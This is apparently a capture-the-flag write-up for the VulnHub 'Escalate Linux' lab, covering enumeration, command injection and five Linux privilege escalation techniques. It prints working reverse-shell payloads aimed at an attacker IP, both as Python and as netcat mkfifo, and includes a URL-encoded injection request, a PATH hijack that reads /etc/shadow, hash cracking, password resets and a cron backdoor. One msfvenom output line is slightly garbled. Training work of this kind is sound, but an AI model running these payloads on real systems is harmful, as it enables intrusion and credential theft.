---
title: ESCALATE LINUX
date: 2021-08-12 05:35:00 +0200
categories: [VlunHub]
tags: [vulnhub, ESCALATE_LINUX, privilege_escalation, SUID, PATH_var, SUDO, crontab, vi_sudo] 

---

# INIT

identify target IP 

```console
➜  ~ nmap -sP 172.16.129.128/24
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-12 10:26 EDT
Nmap scan report for Home (172.16.129.1)
Host is up (0.0010s latency).
Nmap scan report for 172.16.129.2
Host is up (0.00088s latency).
Nmap scan report for 172.16.129.128
Host is up (0.00069s latency).
Nmap scan report for 172.16.129.139
Host is up (0.0034s latency).
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.73 seconds

```



edit `/etc/hosts` file => (local DNS)

```console
# Vulnhub
172.16.129.139  Esclinux.vuln
```

lets starting ...

# Scanning

### Nmap

```console
➜  ~ sudo nmap -A -p- -T4 Esclinux.vuln 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-12 10:27 EDT
Nmap scan report for Esclinux.vuln (172.16.129.139)
Host is up (0.0011s latency).
Not shown: 65526 closed ports
PORT      STATE SERVICE     VERSION
80/tcp    open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      34511/udp   mountd
|   100005  1,2,3      50751/tcp   mountd
|   100005  1,2,3      55807/tcp6  mountd
|   100005  1,2,3      57755/udp6  mountd
|   100021  1,3,4      38135/tcp   nlockmgr
|   100021  1,3,4      38777/tcp6  nlockmgr
|   100021  1,3,4      54049/udp   nlockmgr
|   100021  1,3,4      60507/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
2049/tcp  open  nfs_acl     3 (RPC #100227)
38135/tcp open  nlockmgr    1-4 (RPC #100021)
41879/tcp open  mountd      1-3 (RPC #100005)
50079/tcp open  mountd      1-3 (RPC #100005)
50751/tcp open  mountd      1-3 (RPC #100005)
MAC Address: 00:0C:29:9F:EB:8D (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Host: LINUX

Host script results:
|_clock-skew: mean: 1h19m59s, deviation: 2h18m33s, median: 0s
|_nbstat: NetBIOS name: LINUX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: osboxes
|   NetBIOS computer name: LINUX\x00
|   Domain name: \x00
|   FQDN: osboxes
|_  System time: 2021-08-12T10:27:39-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-08-12T14:27:39
|_  start_date: N/A

TRACEROUTE
HOP RTT     ADDRESS
1   1.07 ms Esclinux.vuln (172.16.129.139)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.98 seconds
```



# Enumeration

**port 80** is opened let's take a look

![image-20210812163546456](/assets/2021-08-12-ESCALATE-LINUX/image-20210812163546456.png)

default page ...

**Wappalyzer**

![image-20210812164054749](/assets/2021-08-12-ESCALATE-LINUX/image-20210812164054749.png)



**Check directory**

```console
➜  ~ gobuster dir -u http://esclinux.vuln -w ~/SecLists/Discovery/Web-Content/Common-PHP-Filenames.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://esclinux.vuln
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/x/SecLists/Discovery/Web-Content/Common-PHP-Filenames.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/08/12 10:40:21 Starting gobuster in directory enumeration mode
===============================================================
/shell.php            (Status: 200) [Size: 29]
                                              
===============================================================
2021/08/12 10:40:21 Finished
===============================================================
```

`/shell.php` directory

![image-20210812165000846](/assets/2021-08-12-ESCALATE-LINUX/image-20210812165000846.png)

let pass this var with `ifconfig` command

![image-20210812165108427](/assets/2021-08-12-ESCALATE-LINUX/image-20210812165108427.png)

it works ... *this vulnerability called command injection*



# Exploiting

sending reverse shell

```console
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.16.129.128",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'ip
```

set listening port

```console
➜  ~ nc -nlvp 1234
```

GET request

```http
http://esclinux.vuln/shell.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22172.16.129.128%22,1234));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27ip
```

We get SHELL 

```console
➜  ~ nc -nlvp 1234
listening on [any] 1234 ...

connect to [172.16.129.128] from (UNKNOWN) [172.16.129.139] 59640
/bin/sh: 0: can't access tty; job control turned off
$ whoami
user6
```

spawn shell

```console
$ python3 -c "__import__('pty').spawn('/bin/bash')"
Welcome to Linux Lite 4.4 
 
Thursday 12 August 2021, 11:11:45
Memory Usage: 343/985MB (34.82%)
Disk Usage: 5/217GB (3%)
Support - https://www.linuxliteos.com/forums/ (Right click, Open Link)
 
 user6  / | var | www | html  
```

- [x] Regular User Account Access



# Privilege Escalation

you can run Linux Privilege Escalation Awesome Script - [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) for fast enumeration

here we go for manual way ...

## #01 SUID rights Exploit

execute this command `find / -perm -u=s -type f 2>/dev/null `  searching for "sticky bits"

![image-20210812175411254](/assets/2021-08-12-ESCALATE-LINUX/image-20210812175411254.png) 


run the shell 

![image-20210812175221951](/assets/2021-08-12-ESCALATE-LINUX/image-20210812175221951.png)

- [x] Root User Account Access



## #02 Cracking the root password "PATH Variable"

as we notice that running `/home/user5/script`

trigger `ls` command

let's abuse this  *remember this exploit run because sticky bit  -run as root-*

```console
cd /tmp
echo "cat /etc/shadow" > ls
chmod 777 ls
export PATH=/tmp:$PATH
cd /home/user5
./script
```

![image-20210812181317964](/assets/2021-08-12-ESCALATE-LINUX/image-20210812181317964.png)

copy root shadow to attacker machine in text file called shadow 

using john the ripper to crack password

```console
➜  ~ john shadow  
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
12345            (?)
1g 0:00:00:00 DONE 2/3 (2021-08-12 12:31) 10.00g/s 2560p/s 2560c/s 2560C/s 123456..franklin
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

password is **12345**

![image-20210812183447230](/assets/2021-08-12-ESCALATE-LINUX/image-20210812183447230.png)

- [x] Root User Account Access



## #03 Root shell by exploiting SUDO rights of user1

if all password hard to crack we can change 

```console
echo 'echo "user1:12345" | chpasswd' > ls
chmod 777 ls
export PATH=/tmp:$PATH
cd /home/user5
./script
su user1
sudo –l
sudo su
```

Credentials : `user1:12345`

![image-20210812184549446](/assets/2021-08-12-ESCALATE-LINUX/image-20210812184549446.png)

`sudo -l` to list privilege of user

wait !! user1 can sudo all things with no password 

![image-20210812184932975](/assets/2021-08-12-ESCALATE-LINUX/image-20210812184932975.png)

- [x] Root User Account Access



## #04  Reverse Root shell by exploiting crontab

`cat /etc/crontab` to see scheduled tasks

![image-20210812185432059](/assets/2021-08-12-ESCALATE-LINUX/image-20210812185432059.png) 

remember we have root access 3 ways above

lets create reverse shell

```console
# attacker machine
➜  ~ msfvenom -p cmd/unix/reverse_netcat LHOST=10.0.2.17 LPORT=443 -f raw
mkfifo /tmp/znaiyl; 172.16.129.128 4444 0</tmp/znaiyl | /bin/sh >/tmp/znaiyl 2>&1; rm /tmp/znaiyl
➜  ~ nc -nlvp 4444
```

 ```console
 # target shell
 echo 'mkfifo /tmp/bxyrmrg; nc 172.16.129.128 4444 0</tmp/bxyrmrg | /bin/sh >/tmp/bxyrmrg 2>&1; rm /tmp/bxyrmrg' >> autoscript.sh
 ```

- [x] now we have reverse shell with root privilege



## #05 Exploiting SUDO rights of vi editor

We changed the password of all the users to 12345 using the same methodology as above and switched between users to check for more exploits. We found that user8 has a sudo permission for vi editors.

![image-20210812192221813](/assets/2021-08-12-ESCALATE-LINUX/image-20210812192221813.png)

run `sudo vi`

enter this in vi

```console
:!sh
ids
```



![image-20210812192940487](/assets/2021-08-12-ESCALATE-LINUX/image-20210812192940487.png)

![image-20210812193023386](/assets/2021-08-12-ESCALATE-LINUX/image-20210812193023386.png)

- [x] Root User Account Access
